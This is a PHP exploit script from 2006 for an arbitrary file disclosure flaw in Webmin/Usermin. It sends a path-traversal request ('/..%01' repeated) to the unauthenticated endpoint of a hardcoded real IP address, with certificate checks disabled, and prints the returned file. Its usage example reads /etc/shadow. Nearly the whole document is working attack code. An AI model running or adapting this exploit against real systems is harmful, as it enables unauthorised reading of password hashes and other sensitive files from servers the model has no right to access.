<?php
/*
Name : Webmin / Usermin Arbitrary File Disclosure Vulnerability
Date : 2006-06-30
Patch : update to version 1.290
Advisory : http://securitydot.net/vuln/exploits/vulnerabilities/articles/17885/vuln.html
Coded by joffer , http://securitydot.net
*/

$host = '202.113.3.106';
$port = '10000';
$http = 'https';
$file = $_GET['path'];
// CHECKING THE INPUT
if($host != "" && $port != "" && $http != "" && $file != "") {
 

$z = "/..%01";
for ($i=0;$i<60;$i++) {
 $z.="/..%01";
}

$target = $http."://".$host.":".$port."/unauthenticated".$z."/".$file."";

echo "Attacking ".$host."\n";
echo "---------------------------------\n";

// INITIALIZING CURL SESSION TO THE TARGET

$ch = curl_init();

curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt ($ch, CURLOPT_TIMEOUT, '10');
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);

echo  curl_exec($ch);
curl_close ($ch);


echo "---------------------------------\n";
echo "Coded by joffer , http://securitydot.net\n";

} else {
 // IF INPUT IS NOT CORRECT DISPLAY THE README
 echo "Usage php webmin.php HOST PORT HTTP/HTTPS FILE\n";
 echo "Example : php webmin.php localhost 10000 http /etc/shadow\n";
 echo "Coded by joffer , http://securitydot.net\n";
}

?>